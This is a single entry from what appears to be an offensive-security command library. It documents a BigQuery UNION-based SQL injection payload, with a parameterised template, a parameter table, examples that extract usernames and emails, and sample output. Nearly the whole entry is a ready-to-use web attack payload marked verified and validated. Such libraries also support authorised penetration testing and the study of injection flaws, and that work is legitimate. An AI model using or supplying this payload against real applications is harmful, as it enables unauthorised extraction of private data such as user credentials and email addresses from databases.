---
type: command
executor: sql
data: >-
  UNION ALL SELECT $_COLUMN_NAME, 1, 1 FROM (SELECT $_COLUMN_NAME AS new_name
  FROM `$_PROJECT_ID.$_DATASET_NAME.$_TABLE_NAME`) AS A GROUP BY $_COLUMN_NAME
output: null
created_at: '2023-04-06T03:56:32.353507+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - GCP
tags:
  - sqli
  - union-injection
verified: true
validated: true
---

# bigquery-union-select-column-and-constants

## Command

```sql
UNION ALL SELECT $_COLUMN_NAME, 1, 1 FROM (SELECT $_COLUMN_NAME AS new_name FROM `$_PROJECT_ID.$_DATASET_NAME.$_TABLE_NAME`) AS A GROUP BY $_COLUMN_NAME
```

## Description

This command performs a union injection to select data from a specific column while padding with constants to match the original query's structure, using a subquery alias for BigQuery compatibility.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_COLUMN_NAME | Target column to extract | Yes |
| $_PROJECT_ID | Project ID | Yes |
| $_DATASET_NAME | Dataset name | Yes |
| $_TABLE_NAME | Table name | Yes |

## Examples

### Basic Usage

```sql
SELECT * FROM original UNION ALL SELECT username, 1, 1 FROM (SELECT username AS new_name FROM `proj.dataset.table`) AS A GROUP BY username
```

### Advanced Usage

```sql
SELECT * FROM original UNION ALL SELECT email, NULL, 'test' FROM (SELECT email FROM `proj.dataset.table`) AS A GROUP BY email LIMIT 10
```

## Expected Output

Combined results with injected column data:

| col1 | col2 | col3 |
|------|------|------|
| orig | data |      |
| user | 1    | 1    |

## Related

- [[procedures/BigQuery-Union-Based-SQL-Injection]]
